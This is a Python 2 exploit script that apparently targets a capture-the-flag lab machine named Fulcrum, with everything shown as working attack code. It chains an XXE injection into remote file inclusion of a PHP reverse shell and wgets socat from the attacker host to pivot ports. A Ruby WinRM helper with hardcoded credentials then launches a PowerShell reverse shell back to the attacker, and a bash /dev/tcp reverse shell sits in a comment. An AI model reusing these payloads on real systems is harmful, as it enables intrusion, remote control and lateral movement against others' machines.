#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Author: Alamot (Antonios Tsolis)
import re
import sys
import time
from pwn import *
import signal, thread
import requests, urllib3
import SimpleHTTPServer, SocketServer
from subprocess import Popen
signal.signal(signal.SIGINT, signal.SIG_DFL)

DEBUG = False
LHOST="10.10.15.45"
LPORT=60001
LPORT2=53
RHOST="10.10.10.62"
RPORT=56423
SRVHOST=LHOST
SRVPORT=60000
WINRM_RDPORT=60217
TIMEOUT=30

if DEBUG:
    context.log_level = 'debug'

php_rev_shell = '<?php set_time_limit (0); $VERSION = "1.0"; $ip = "'+str(LHOST)+'"; $port = '+str(LPORT)+'; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\\n"; } } ?>'

#This works too:
#php_rev_shell="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+str(LHOST)+"/"+str(LPORT)+" 0>&1'\");"

ruby_helper = """require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'https://"""+str(RHOST)+":"+str(WINRM_RDPORT)+"""/wsman',
  transport: :ssl,
  user: 'WebUser',
  password: 'M4ng£m£ntPa55',
  :no_ssl_peer_verification => true
)

conn.shell(:powershell) do |shell|
  output = shell.run("$pass = convertto-securestring -AsPlainText -Force -String '@fulcrum_bf392748ef4e_$'; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'fulcrum.local\\\\923a',$pass; Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('"""+str(LHOST)+"',"+str(LPORT2)+"""); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); try { $sendback = (iex $data | Out-String ); } catch { $sendback = ($_.Exception|out-string) }; $sendback2 = $sendback + 'PS ' + $(whoami) + '@' + $env:computername + ' ' + $((gi $pwd).Name) + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }") do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
"""


def start_webserver():
    try:
        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
        httpd = SocketServer.TCPServer(("", SRVPORT), Handler)
        log.info("Serving payload at port " + str(SRVPORT))
        httpd.serve_forever()
        log.info("Web server thread exited successfully.")
    except (KeyboardInterrupt, SystemExit):
        httpd.shutdown()

def send_payload():
    try:
        client = requests.session()
        client.keep_alive = True
        # Send payload
        log.info("Sending php shell payload...")
        xml="<?xml version='1.0' encoding='UTF-8' ?><!DOCTYPE hack [<!ENTITY xxe SYSTEM 'http://127.0.0.1:4/index.php?page=http://"+str(SRVHOST)+":"+str(SRVPORT)+"/shell' >]><foo>&xxe;</foo>"
        response = client.post("http://"+str(RHOST)+":"+str(RPORT)+"/", data=xml)
    except requests.exceptions.RequestException as e:
        log.failure(str(e))
    finally:
        if client:
            client.close()
        #log.info("Web payload thread exited successfully.")


with open("shell.php", "wt") as f:
    f.write(php_rev_shell)
with open("ruby_helper.rb", "wb") as f:
    f.write(ruby_helper)
try:
    th1 = threading.Thread(target=start_webserver)
    th2 = threading.Thread(target=send_payload)
    th1.daemon = True
    th2.daemon = True
    th1.start()
    th2.start()
    phpshell = listen(LPORT, timeout=TIMEOUT).wait_for_connection()
    if phpshell.sock is None:
        log.failure("Connection timeout.")
        sys.exit()
    phpshell.sendline("cd /dev/shm")
    log.info("Uploading socat for port redirection")
    phpshell.sendline("wget http://"+str(SRVHOST)+":"+str(SRVPORT)+"/socat")
    phpshell.sendline("chmod +x socat")
    phpshell.sendline("./socat tcp-listen:"+str(WINRM_RDPORT)+",reuseaddr,fork tcp:192.168.122.228:5986 &")
    #Uncomment if you want an interactive shell on the webserver instead of the file server
    #phpshell.interactive()
    #sys.exit()
    time.sleep(5)
    log.info("Executing ruby_helper.rb")
    Popen(["ruby", "ruby_helper.rb"])
    pssh = listen(LPORT2, timeout=TIMEOUT).wait_for_connection()
    pssh.interactive()
    sys.exit()
except (KeyboardInterrupt, SystemExit):
    th1.join()
    th2.join()
except Exception as e:
    log.failure(str(e))
